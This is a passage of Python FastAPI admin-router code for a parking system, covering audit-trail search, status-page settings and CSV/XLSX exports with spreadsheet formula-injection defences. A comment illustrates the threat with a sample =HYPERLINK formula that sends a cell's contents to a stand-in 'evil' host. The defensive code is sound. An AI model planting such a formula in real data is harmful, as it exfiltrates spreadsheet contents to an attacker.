# ---------------------------------------------------------------------------
@router.get("/status-page", dependencies=[Depends(require_full_admin)])
def get_status_page_config(db: DBSession = Depends(get_db)):
    return {
        "enabled": crud.get_setting(db, "status_page_enabled", "false") == "true",
        "base_url": crud.get_setting(db, "status_page_base_url", "") or "",
    }


@router.put("/status-page", dependencies=[Depends(require_full_admin)])
def update_status_page_config(payload: dict, actor: dict = Depends(require_full_admin), db: DBSession = Depends(get_db)):
    if "enabled" in payload:
        crud.set_setting(db, "status_page_enabled", "true" if payload["enabled"] else "false")
    if "base_url" in payload:
        url = (payload["base_url"] or "").strip().rstrip("/")
        if url and not (url.startswith("https://") or url.startswith("http://")):
            raise HTTPException(status_code=400, detail="URL must start with https:// or http://")
        crud.set_setting(db, "status_page_base_url", url)
    crud.log_audit(db, actor, "STATUS_PAGE_UPDATED", None, f"enabled={payload.get('enabled')}; base_url={payload.get('base_url')}")
    return {"ok": True}


# ---------------------------------------------------------------------------
# Audit trail and monthly-subscriber movements (admin-only)
# ---------------------------------------------------------------------------
def _audit_out(a) -> dict:
    return AuditOut(id=a.id, ts=a.ts, username=a.username, role=a.role, action=a.action,
                    subject=a.subject, details=a.details).model_dump()


def _monthly_event_out(e) -> dict:
    return MonthlyEventOut(id=e.id, subscription_id=e.subscription_id, direction=e.direction, ts=e.ts,
                           recorded_by=e.recorded_by, customer_name=e.customer_name, plate=e.plate,
                           space_number=e.space_number).model_dump()


def _range_filters(date_preset: str | None, date_from: str | None, date_to: str | None) -> dict:
    d_from, d_to = _resolve_date_range(date_preset, date_from, date_to)
    return dict(date_from=d_from, date_to=d_to)


@router.get("/audit", dependencies=[Depends(require_full_admin)])
def audit_trail(action: str | None = None, username: str | None = None, q: str | None = None,
                date_preset: str | None = None, date_from: str | None = None, date_to: str | None = None,
                limit: int = 100, offset: int = 0, db: DBSession = Depends(get_db)):
    limit = max(1, min(limit, 1000))
    offset = max(0, offset)
    rows, total = crud.search_audit(db, action=action or None, username=username or None, q=q or None,
                                    limit=limit, offset=offset,
                                    **_range_filters(date_preset, date_from, date_to))
    return {"total": total, "limit": limit, "offset": offset, "results": [_audit_out(a) for a in rows]}


@router.get("/monthly-events", dependencies=[Depends(require_full_admin)])
def monthly_events(q: str | None = None, date_preset: str | None = None, date_from: str | None = None,
                   date_to: str | None = None, limit: int = 100, offset: int = 0,
                   db: DBSession = Depends(get_db)):
    limit = max(1, min(limit, 1000))
    offset = max(0, offset)
    rows, total = crud.search_monthly_events(db, q=q or None, limit=limit, offset=offset,
                                             **_range_filters(date_preset, date_from, date_to))
    return {"total": total, "limit": limit, "offset": offset, "results": [_monthly_event_out(e) for e in rows]}


def _csv_download(columns: list[str], rows: list[dict], prefix: str) -> StreamingResponse:
    buf = io.StringIO()
    buf.write("\ufeff")   # BOM: Excel opens accents correctly on double-click
    writer = csv.DictWriter(buf, fieldnames=columns)
    writer.writeheader()
    for row in rows:
        writer.writerow({c: _csv_safe(row.get(c)) for c in columns})
    filename = f"{prefix}_{datetime.now():%Y%m%d_%H%M%S}.csv"
    return StreamingResponse(
        iter([buf.getvalue()]), media_type="text/csv; charset=utf-8",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


@router.get("/export/audit", dependencies=[Depends(require_full_admin)])
def export_audit(action: str | None = None, username: str | None = None, q: str | None = None,
                 date_preset: str | None = None, date_from: str | None = None, date_to: str | None = None,
                 db: DBSession = Depends(get_db)):
    rows, _ = crud.search_audit(db, action=action or None, username=username or None, q=q or None,
                                limit=100000, **_range_filters(date_preset, date_from, date_to))
    return _csv_download(["ts", "username", "role", "action", "subject", "details"],
                         [_audit_out(a) for a in rows], "parking_audit")


@router.get("/export/monthly-events", dependencies=[Depends(require_full_admin)])
def export_monthly_events(q: str | None = None, date_preset: str | None = None, date_from: str | None = None,
                          date_to: str | None = None, db: DBSession = Depends(get_db)):
    rows, _ = crud.search_monthly_events(db, q=q or None, limit=100000,
                                         **_range_filters(date_preset, date_from, date_to))
    return _csv_download(["ts", "direction", "customer_name", "plate", "space_number", "recorded_by"],
                         [_monthly_event_out(e) for e in rows], "parking_monthly_movements")


# ---------------------------------------------------------------------------
# Exports (admin-only)
# ---------------------------------------------------------------------------
HISTORY_COLUMNS = [
    "id", "customer_name", "plate", "phone", "person_type", "unit", "visiting", "vehicle",
    "space_number", "entry_timestamp", "exit_timestamp", "duration_minutes",
    "pricing_rule_name", "status", "final_amount", "source", "checked_in_by", "checked_out_by",
]

# Spreadsheet formula injection ("CSV injection"): the customer name and plate
# come from a PUBLIC form, and Excel/LibreOffice/Google Sheets evaluate a cell
# that starts with = + - @ (or a tab/CR) as a formula. Without this, a
# registration named  =HYPERLINK("http://evil/?"&A1,"click")  turns into a live
# formula in the file the administrator opens. Pure phone-style/numeric values
# such as "+57 300 123 4567" are left alone.
_FORMULA_TRIGGERS = ("=", "+", "-", "@", "\t", "\r")
_PHONE_OR_NUMBER = re.compile(r"^[+-]?[0-9][0-9 ()-]*$")


def _is_formula_like(value) -> bool:
    return (
        isinstance(value, str)
        and value.startswith(_FORMULA_TRIGGERS)
        and not _PHONE_OR_NUMBER.match(value)
    )


def _csv_safe(value):
    """CSV has no cell types, so neutralise with the standard leading quote."""
    return "'" + value if _is_formula_like(value) else value


def _export_rows(db: DBSession, filters: dict):
    rows, _ = crud.search_history(db, limit=100000, **filters)
    for s in rows:
        yield _to_session_detail(db, s).model_dump()


@router.get("/export/csv", dependencies=[Depends(require_full_admin)])
def export_csv(filters: dict = Depends(history_filters), db: DBSession = Depends(get_db)):
    buf = io.StringIO()
    # utf-8-sig BOM so Excel opens accents (ñ, á, ...) correctly on double-click.
    buf.write("\ufeff")
    writer = csv.DictWriter(buf, fieldnames=HISTORY_COLUMNS)
    writer.writeheader()
    for detail in _export_rows(db, filters):
        writer.writerow({c: _csv_safe(detail.get(c)) for c in HISTORY_COLUMNS})
    filename = f"parking_history_{datetime.now():%Y%m%d_%H%M%S}.csv"
    return StreamingResponse(
        iter([buf.getvalue()]),
        media_type="text/csv; charset=utf-8",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


@router.get("/export/xlsx", dependencies=[Depends(require_full_admin)])
def export_xlsx(filters: dict = Depends(history_filters), db: DBSession = Depends(get_db)):
    wb = Workbook()
    ws = wb.active
    ws.title = "Parking History"
    ws.append(HISTORY_COLUMNS)
    for detail in _export_rows(db, filters):
        ws.append([detail.get(c) for c in HISTORY_COLUMNS])
        for cell in ws[ws.max_row]:
            # openpyxl turns any string starting with "=" into a formula;
            # force text so customer-supplied values are never evaluated.
            if isinstance(cell.value, str) and cell.value.startswith("="):
                cell.data_type = "s"
    for i, col in enumerate(HISTORY_COLUMNS, start=1):
        ws.column_dimensions[ws.cell(row=1, column=i).column_letter].width = max(14, len(col) + 2)

    buf = io.BytesIO()
    wb.save(buf)
    buf.seek(0)
    filename = f"parking_history_{datetime.now():%Y%m%d_%H%M%S}.xlsx"
    return StreamingResponse(
        buf,
        media_type="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )
